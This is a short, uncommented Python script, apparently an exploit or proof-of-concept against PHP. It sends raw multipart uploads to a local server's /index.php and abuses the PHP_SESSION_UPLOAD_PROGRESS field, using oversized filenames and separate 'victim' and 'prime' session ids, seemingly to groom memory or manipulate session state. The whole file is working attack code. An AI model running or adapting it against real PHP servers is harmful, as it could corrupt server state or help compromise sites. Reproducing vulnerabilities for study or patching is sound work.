#!/usr/bin/env python3
import socket,sys
port=int(sys.argv[1]);size1=int(sys.argv[2]) if len(sys.argv)>2 else 500000;size2=int(sys.argv[3]) if len(sys.argv)>3 else 900000
def send(body,sid):
 b=b'UPRIME';q=f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\nCookie: PHPSESSID={sid}\r\nContent-Type: multipart/form-data; boundary={b.decode()}\r\nContent-Length: {len(body)}\r\n\r\n'.encode()+body
 s=socket.create_connection(('127.0.0.1',port),3);s.sendall(q);s.settimeout(12)
 try:
  while s.recv(65536):pass
 except:pass
 s.close()
def part(name,val,fn=None):
 b=b'UPRIME';return b'--'+b+b'\r\nContent-Disposition: form-data; name="'+name+b'"'+((b'; filename="'+fn+b'"')if fn is not None else b'')+b'\r\n\r\n'+val+b'\r\n'
def upload(fn):return part(b'PHP_SESSION_UPLOAD_PROGRESS',b'x')+part(b'f',b'Z'*32,fn)+b'--UPRIME--\r\n'
for fn,sid in [(b'a','victim'),(b'B'*size1,'prime'),(b'A'*size2,'prime')]:send(upload(fn),sid)
